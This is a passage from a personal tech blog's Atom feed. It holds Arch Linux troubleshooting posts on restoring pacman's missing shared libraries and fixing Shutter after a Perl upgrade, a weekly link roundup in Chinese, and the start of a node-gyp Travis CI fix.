&lt;li&gt;機房在台灣，速度比較快  &lt;/li&gt;
&lt;li&gt;AI 相關應用  &lt;/li&gt;
&lt;li&gt;因為有使用 Google Adwords  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GMobi  &lt;ul&gt;
&lt;li&gt;IoT，最近新增了手機廣告平台  &lt;/li&gt;
&lt;li&gt;需求：Realtime, Scalibility, Pricing, Reliability  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;UrAd  &lt;ul&gt;
&lt;li&gt;Data Source 較多元，得經過非常多的處理。  &lt;/li&gt;
&lt;li&gt;Data business 相關的架構轉移到 GCP  &lt;ul&gt;
&lt;li&gt;Pub/Sub  &lt;/li&gt;
&lt;li&gt;分析：Dataflow, Dataproc, Dataprep  &lt;/li&gt;
&lt;li&gt;儲存：BigQuery, Cloud Storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="GCP"></category><category term="Ad Tech"></category></entry><entry><title>pacman -Rdd gcc-multilib gcc-libs-multilib</title><link href="https://blog.m157q.tw/posts/2017/09/17/pacman-rdd-gcc-multilib-gcc-libs-multilib/" rel="alternate"></link><published>2017-09-17T17:50:32+08:00</published><updated>2017-09-17T17:50:32+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-09-17:posts/2017/09/17/pacman-rdd-gcc-multilib-gcc-libs-multilib/</id><summary type="html">&lt;h3&gt;Preface&lt;/h3&gt;
&lt;p&gt;If you've installed &lt;code&gt;gcc-libs-multilib&lt;/code&gt; and &lt;code&gt;gcc-multilib&lt;/code&gt; in your Arch Linux,&lt;br /&gt;
you might cannot &lt;code&gt;$ sudo pacman -Syu&lt;/code&gt; because sometimes they will conflict with &lt;code&gt;gcc-libs&lt;/code&gt; and &lt;code&gt;gcc&lt;/code&gt; in &lt;code&gt;[core]&lt;/code&gt; repository.  &lt;/p&gt;
&lt;p&gt;You have two choices:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Don't install &lt;code&gt;gcc&lt;/code&gt; and &lt;code&gt;gcc-libs&lt;/code&gt; to avoid the conflict, and wait until &lt;code&gt;gcc-multilib&lt;/code&gt; and &lt;code&gt;gcc-libs-multilib&lt;/code&gt; have new verisons.  &lt;ul&gt;
&lt;li&gt;Remove them from the list of packaged to install of this packages upgrade.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Force remove &lt;code&gt;gcc-multilib&lt;/code&gt; and &lt;code&gt;gcc-libs-multilib&lt;/code&gt; with &lt;code&gt;$ sudo pacman -Rdd gcc-multilib gcc-libs-multilib&lt;/code&gt;.  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;If you do the latter, and break your &lt;code&gt;pacman&lt;/code&gt;, then this blog post may be your salvation.&lt;br /&gt;
I just encountered this situation and that's why I wrote down this blog post.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Error Message&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;pacman: error while loading shared libraries: libstdc++.so.6: cannot open shared object file: No such file or directory  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ldd &lt;span class="k"&gt;$(&lt;/span&gt;which pacman&lt;span class="k"&gt;)&lt;/span&gt;  

...  

libstdc++.so.6 &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; not found  
libgcc_s.so.1 &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; not found  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;These two share objects are gone which make &lt;code&gt;pacman&lt;/code&gt; broken.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Solution&lt;/h3&gt;
&lt;p&gt;Copy &lt;code&gt;libstdc++.so.6&lt;/code&gt; and &lt;code&gt;libgcc_s.so.1&lt;/code&gt; from other Arch Linux computer with same architecture.  &lt;/p&gt;
&lt;p&gt;If you have nothing to copy from, I've backed up these two shared objects with x86_64  architecutre below.  &lt;/p&gt;
&lt;p&gt;(If somehow you cannot download these two files or these doesn't work for you,&lt;br /&gt;
you can try the following link in the reference part.&lt;br /&gt;
Someone also backed up these two files and uploaded them in the reply of the forum thread.)  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Download these 2 share objects:  &lt;ul&gt;
&lt;li&gt;&lt;a href="/files/pacman-rdd-gcc-multilib-gcc-libs-multilib/libstdc++.so.6"&gt;libstdc++.so.6&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;sha256sum: 30c1b6ae5936f5f4afdba39f44465efc84422e957db13580e1891f081b615d0e  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="/files/pacman-rdd-gcc-multilib-gcc-libs-multilib/libgcc_s.so.1"&gt;libgcc_s.so.1&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;sha256sum: 95298eef28aca7cef5b28d8388ef0ea3721add9e7c19df74054d7b1c41bcca2e  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo mv libstdc++.so.6 libgcc_s.so.1 /usr/lib&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo pacman -S --force gcc gcc-libs&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Make sure you use &lt;code&gt;--force&lt;/code&gt; option, or pacman will complain about these two files are conflict.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h3&gt;Reference&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.reddit.com/r/archlinux/comments/6e2no7/pacman_error_libstdcso6/"&gt;pacman error: libstdc++.so.6 : archlinux&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Arch Linux"></category><category term="pacman"></category><category term="gcc"></category><category term="gcc-libs"></category></entry><entry><title>Shutter 0.94-2 broken after Perl upgraded to 5.26 on Arch Linux</title><link href="https://blog.m157q.tw/posts/2017/09/15/shutter-0-94-2-broken-after-perl-upgraded-to-5-26-on-arch-linux/" rel="alternate"></link><published>2017-09-17T14:17:00+08:00</published><updated>2017-09-17T14:17:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-09-15:posts/2017/09/15/shutter-0-94-2-broken-after-perl-upgraded-to-5-26-on-arch-linux/</id><summary type="html">&lt;h3&gt;Error Message&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ shutter  
Can&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t locate Gnome2.pm in @INC &lt;span class="o"&gt;(&lt;/span&gt;you may need to install the Gnome2 module&lt;span class="o"&gt;)&lt;/span&gt;  
&lt;span class="o"&gt;(&lt;/span&gt;@INC contains:  
    /usr/lib/perl5/5.26/site_perl  
    /usr/share/perl5/site_perl  
    /usr/lib/perl5/5.26/vendor_perl  
    /usr/share/perl5/vendor_perl  
    /usr/lib/perl5/5.26/core_perl  
    /usr/share/perl5/core_perl  
&lt;span class="o"&gt;)&lt;/span&gt; at /usr/bin/shutter line &lt;span class="m"&gt;37&lt;/span&gt;.  
BEGIN failed--compilation aborted at /usr/bin/shutter line &lt;span class="m"&gt;37&lt;/span&gt;.  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h3&gt;Solution&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ yaourt -S gnomecanvas-perl  
$ yaourt -S gnome-vfs-perl  
$ pacman -Qqo &lt;span class="s1"&gt;&amp;#39;/usr/lib/perl5/vendor_perl&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; xargs yaourt -S --noconfirm  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h3&gt;Reference&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://forum.manjaro.org/t/aur-install-packages-with-perl-broken-again/30913/9"&gt;AUR install packages with Perl broken again - Updating - Manjaro&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.archlinux.org/news/perl-library-path-change/"&gt;Arch Linux - News: Perl library path change&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="shutter"></category><category term="Perl"></category></entry><entry><title>Y2017W35</title><link href="https://blog.m157q.tw/posts/2017/09/04/y2017w35/" rel="alternate"></link><published>2017-10-19T03:04:29+08:00</published><updated>2017-10-19T03:04:29+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-09-04:posts/2017/09/04/y2017w35/</id><summary type="html">&lt;h3&gt;ai&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.datacamp.com/community/tutorials/scikit-learn-python"&gt;Scikit-Learn 教學：Python 與機器學習 (Article)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Join over 500,000 other Data Science learners and start one of our interactive tutorials today!  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ictar/python-doc/blob/master/Science%20and%20Data%20Analysis/%E5%9C%A8Python%E4%B8%AD%E5%AE%9E%E7%8E%B0%E4%BD%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F.md"&gt;python-doc/在Python中实现你自己的推荐系统.md at master · ictar/python-doc&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;描述了如何使用 Python 來自己撰寫給自己用的推薦系統。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://superuser.com/questions/138331/using-ffmpeg-to-cut-up-video"&gt;command line - Using ffmpeg to cut up video - Super User&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The &lt;code&gt;-ss&lt;/code&gt; part works fine but the &lt;code&gt;-t&lt;/code&gt; is ignored. It correctly removes the initial specified seconds specified with &lt;code&gt;-ss&lt;/code&gt; but then keeps going to the end of the input with the copy.  Is there a way to use ffmpeg to cut off the end of a video without recoding it?  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;devops&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ithome.com.tw/news/116435"&gt;3 種CTO要小心的架構技術債 | iThome&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;三種都有遇到呢，而且真的鞭辟入裡。  &lt;ol&gt;
&lt;li&gt;設計不良的架構，將衍生出後續架構債。  &lt;ul&gt;
&lt;li&gt;設計架構時，無外乎希望能同時滿足三個條件：節省成本、具有擴展性，以及能快速進入市場。然而，一旦沒有滿足其中的任一條件，都會衍生出後續三種架構債。  &lt;/li&gt;
&lt;li&gt;具備實戰經驗的技術團隊，沒有快速進入市場壓力下，通常偏好導入最新、最佳化的架構，因此，在此碰上過於架構過於早熟（Premature）的問題。  &lt;/li&gt;
&lt;li&gt;當開發團隊欠缺架構系統經驗時，系統就會發生缺乏延展性（Scalability）的痛點，導致程式碼不能重複使用，也很難導入高可用性架構或使用水平擴充，「在還清技術債前，只會債臺高築。」  &lt;/li&gt;
&lt;li&gt;起初推出良好商業模式的團隊，在不缺乏資金的情況下，導入品質良好的IT服務，像是使用AWS等基礎架構，執行基本的服務。曾義峰表示，只要營運狀況良好，並足夠支撐這些基礎架構的費用並非壞事，「而一旦後續募資沒有成功，只好裁員節省成本。」  &lt;/li&gt;
&lt;li&gt;導入最小可行性產品（Minimum viable product，MVP）的觀念也是一種解決方法。但是，「如果MVP沒有控制好，技術債會迅速成長」  &lt;/li&gt;
&lt;li&gt;由於每階段產品都面臨許多變更，老舊程式不容易清除，導致程式碼很難重複利用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;推動 MVP 時，必須設定技術債的上限值。  &lt;ul&gt;
&lt;li&gt;當開發團隊發現超過上限值時，得著手清除技術債。  &lt;/li&gt;
&lt;li&gt;當技術債太多，就得面臨系統重構或改寫的問題。  &lt;/li&gt;
&lt;li&gt;如果沒有解決本質的問題，未來新架構也會碰上一樣的問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;需求永遠不明確，因此系統架構得要具有彈性。  &lt;ul&gt;
&lt;li&gt;例如，需求方與開發方溝通不順，需求方並沒有提出足夠詳細的規格書，導致開發者無法實作部分功能，滿足該方需求。  &lt;/li&gt;
&lt;li&gt;開發者也得讓系統架構更有彈性，當需求改變，導致程式設計有改變時，「預想但是不過早優化，不該把每次的新需求都視作獨立需求。」  &lt;/li&gt;
&lt;li&gt;當需求方提出規格時，開發者不該只單線式思考，反之，「要使用抽象化思考的模式，仔細剖析該需求中，存在著哪一些變數。」  &lt;/li&gt;
&lt;li&gt;即使架構設計的再如何完善，終有一天必須被拋棄。即使必須捨棄現有架構，未必是一件失敗的事，重點在於清楚必須放棄的理由，以及新架構該如何執行、何時執行，「清楚明白打掉重練比較好，就勇敢執行吧！」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.travis-ci.com/2017-08-24-trigger-custom-build"&gt;The Travis CI Blog: Create custom builds from the web UI&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;終於可以在 Travis CI 抽筋的時候不用 close  reopen PR 或重 push code 了嗎  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.rowkey.me/blog/2017/08/24/arch/"&gt;谈谈架构 - 后端技术杂谈 | 飒然Hang&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用投影片來呈現挺精簡的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloudplatform.googleblog.com/2017/08/preventing-log-waste-with-Stackdriver-Logging.html"&gt;Google Cloud Platform Blog:  Preventing log waste with Stackdriver Logging&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以針對要收集哪些 log 做條件過濾了 看來離之前公告過但暫緩的收費日期不遠矣  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloudplatform.googleblog.com/2017/08/introducing-Puppet-support-for-Google-Cloud-Platform24.html"&gt;Google Cloud Platform Blog: Introducing Puppet support for Google Cloud Platform&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GCP 支援 puppet 了啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloudplatform.googleblog.com/2017/08/introducing-App-Engine-firewall-an-easy-way-to-control-access-to-your-app.html"&gt;Google Cloud Platform Blog: Introducing App Engine firewall, an easy way to control access to your app&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GAE 可以設定防火牆了啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://breezymove.blogspot.tw/2017/08/purism-librem-5.html"&gt;Purism 推出的安全、隱私手機— Librem 5 群眾募資計畫&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「Pursim 這間公司，正努力打造跑 GNU/Linux 不必煩惱的 Librem 電腦/平板/手機硬體產品。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;mysql&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2017/08/mysql-check-alive-ping-2017/amp/"&gt;MySQL CLI ping 驗證是否活著 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;mysqladmin ping&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;nginx&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.gcos.me/2017-04-20_talk-about-nginx-accept-mutex.html"&gt;Nginx 的 accept_mutex 啟用或關閉？ | Ant's ATField&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;第一次聽到 Thundering herd problem  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/the-bayesian-trap/%E7%BF%BB%E8%AD%AF-%E9%A0%98%E5%B0%8E%E5%B0%88%E6%A1%88%E8%B5%B0%E5%90%91%E6%88%90%E5%8A%9F%E7%9A%84%E8%B3%87%E6%B7%B1%E5%B7%A5%E7%A8%8B%E5%B8%AB%E4%B9%8B%E8%B7%AF-d7992395277a"&gt;[翻譯] 領導專案走向成功的資深工程師之路 – The Bayesian Trap – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;很棒的翻譯，是個可以拿來當作目標且隔一段時間後可以拿來自省的文章。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ofek/pypinfo"&gt;GitHub - ofek/pypinfo: Easily view PyPI download statistics via Google's BigQuery.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來 PyPI 有 Google Bigquery 的 public dataset 啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kennethreitz/setup.py"&gt;GitHub - kennethreitz/setup.py: 📦 A Human's Ultimate Guide to setup.py.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;setup.py&lt;/code&gt; 的優良範例  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.python-guide.org/en/latest/"&gt;The Hitchhiker’s Guide to Python! — The Hitchhiker's Guide to Python&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ictar/python-doc"&gt;GitHub - ictar/python-doc: translate python documents to Chinese for convenient reference 简而言之，这里用来存放那些Python文档君们，并且尽力将其翻译成中文~~&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;翻譯翻到有 8xx 顆星星好像有點厲害，收藏一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://speakerdeck.com/uranusjr/the-python-you-dont-know"&gt;The Python You Don’t Know // Speaker Deck&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;介紹了一些 Python 比較鮮為人知的特性。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ofek/pypinfo"&gt;ofek/pypinfo: Easily view PyPI download statistics via Google's BigQuery.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This is relatively painless, I swear.  pypinfo accepts 0 or more options, followed by exactly 1 project, followed by 0 or more fields. By default only the last 30 days are queried. Let's take a look at some examples!  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;透過抓取 PyPI 在 Google Bigquery 上的 public dataset 的資料來顯示 PyPI 上的 package 的資訊，例如下載量等等。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib/166520"&gt;networking - Finding local IP addresses using Python's stdlib - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;How can I find local IP addresses (i.e. 192.168.x.x or 10.0.x.x) in Python platform independently and using only the standard library?  This won't work always (returns 127.0.0.1 on machines having the hostname in /etc/hosts as 127.0.0.1), a paliative would be what gimel shows, use socket.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;import socket; socket.gethostbyname(socket.gethostname())&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/23292242/converting-to-not-from-ipython-notebook-format/35720002"&gt;python - Converting to (not from) ipython Notebook format - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;IPython Notebook comes with nbconvert, which can export notebooks to other formats.  But how do I convert text in the opposite direction? I ask because I already have materials, and a good workflow, in a different format, but I would like to take advantage of Notebook's interactive environment.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.gooread.com/article/20120976319/"&gt;用 python 寫一個簡單的推薦系統 - GOOREAD&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://kate.io/blog/2017/08/22/weird-python-integers/"&gt;Weird Python Integers – Kate Murphy&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Note: all of this code was run on my machine using Python 3.6.1. Not everything will work the same if you test using Python 2.  That is suprising! It turns out that all “small integers” with the same value point to the same memory.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://szlin.me/2017/08/23/kernel_seccomp/"&gt;seccomp 學習筆記 – SZ Lin  &amp;amp; Embedded Linux&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://groups.google.com/forum/#!msg/digital-analytics-fundamentals/V9z4TVXQW_4/OgW6M9xJLqAJ"&gt;Google 網上論壇&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;不要再說啥 Google Analytics 的 code 擺哪裡都沒差了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hacks.mozilla.org/2017/08/life-after-flash-multimedia-for-the-open-web/"&gt;Life After Flash: Multimedia for the Open Web ★&lt;br /&gt;
        Mozilla Hacks – the Web developer blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;介紹了許多可以取代 Flash 的標準  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hacks.mozilla.org/2017/08/flash-in-memoriam/"&gt;Flash, In Memoriam ★&lt;br /&gt;
        Mozilla Hacks – the Web developer blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;紀錄了 Flash 從出生到將死的一些重大事件  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.acolyer.org/2017/08/24/a-cloud-based-content-gathering-network/"&gt;A cloud-based content gathering network | the morning paper&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;只聽過 CDN 第一次聽到 CGN  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2017/08/taiwan-first-mit-satellite-2017/amp/"&gt;台灣自製衛星「福爾摩沙衛星五號」升空 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇整理得更詳細了一些  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://apan1121.github.io/powerInfo/"&gt;台灣電廠即時機組發電量&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這真的挺棒的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.reddit.com/r/AsiaTripper/comments/62e7h4/%E5%8F%A4%E5%9F%83%E5%8F%8A%E5%A4%A9%E7%84%B6%E8%BF%B7%E5%B9%BB%E8%97%A5%E8%97%8D%E7%9D%A1%E8%93%AE%E9%AB%94%E9%A9%97%E5%BF%83%E5%BE%97blue_lotus_trip_report/"&gt;古埃及天然迷幻藥「藍睡蓮」體驗心得（Blue Lotus Trip Report） : AsiaTripper&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我的吃法是泡茶，粉狀的藍睡蓮要用煮沸的熱水去泡，就像真的在泡茶一樣  喝的時候意外沒有異味 反而還有一股淡淡茶香 聽說也可以搭配一般的其他茶葉或茶包喝  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@jhihsianwu/%E6%88%90%E7%94%B2-%E7%B2%BE%E6%BA%96%E5%AD%B8%E7%BF%92-%E6%91%98%E8%A6%81-82bd3dbe55f1?source=rss-e187bf7c71f------2"&gt;成甲《精準學習》| 摘要 – Jhih-Sian Wu – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「記錄的意義並不在於以後有人看。記錄過程本身就是意義。你做的所有事情的意義，不在於以後，就在於當下。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@jhihsianwu/%E9%97%9C%E6%96%BC%E8%BE%AD%E8%81%B7-%E8%BD%89%E8%A1%8C-%E6%80%9D%E8%80%83-%E6%96%87%E7%AB%A0%E5%88%86%E4%BA%AB-c8c26319d25b?source=rss-e187bf7c71f------2"&gt;關於辭職、轉行、思考｜文章分享 – Jhih-Sian Wu – Medium&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.zeroplex.tw/2017/08/coffee-highfive.html"&gt;尋找適合自己的工作場所 - Coffee Highfive - Zeroplex 生活隨筆&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;所以除了 cafe nomad 又有其他選擇了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.taiwannutrition.com/blog/bulletproof-coffee/"&gt;體重管理新趨勢：防彈咖啡和生酮飲食 - 台灣營養&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;無論你是不是正在減肥，大概都聽說過防彈咖啡（bulletproof coffee）這個新名詞。防彈咖啡堪稱是今年最夯的飲料，從歐美明星如《分歧者》女主角雪琳伍德莉（Shailene Woodley）、「1世代」成員哈利（Harry Styles），到台灣的健身部  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://udn.com/news/story/7016/2505160"&gt;防彈咖啡減肥法正流行 | 雜誌 | 聯合新聞網&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;最近國內外流行喝「防彈咖啡」減肥，這也是運動人士愛用的補充能量配方，可以提供滿滿活力。這種聽起來超級酷炫的咖啡，究竟是什麼？  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="ai"></category><category term="cli"></category><category term="devops"></category><category term="gcp"></category><category term="life"></category><category term="linux"></category><category term="misc"></category><category term="mysql"></category><category term="nginx"></category><category term="programmer"></category><category term="python"></category><category term="security"></category><category term="taiwan"></category><category term="web"></category></entry><entry><title>Error: contextify@0.1.15 install: `node-gyp rebuild`</title><link href="https://blog.m157q.tw/posts/2017/09/01/error-contextify-0-1-15-install-node-gyp-rebuild/" rel="alternate"></link><published>2017-09-01T16:25:08+08:00</published><updated>2017-09-01T16:25:08+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-09-01:posts/2017/09/01/error-contextify-0-1-15-install-node-gyp-rebuild/</id><summary type="html">&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;Encountered this error of one build on Travis CI of some project.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Solution&lt;/h2&gt;
&lt;p&gt;Downgrade node to 6.11 which is LTS version can solved this problem.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;- nvm install v6.11.2  
- nvm use v6.11.2  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Add these two lines into &lt;code&gt;install&lt;/code&gt; part of &lt;code&gt;.travis.yml&lt;/code&gt;.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
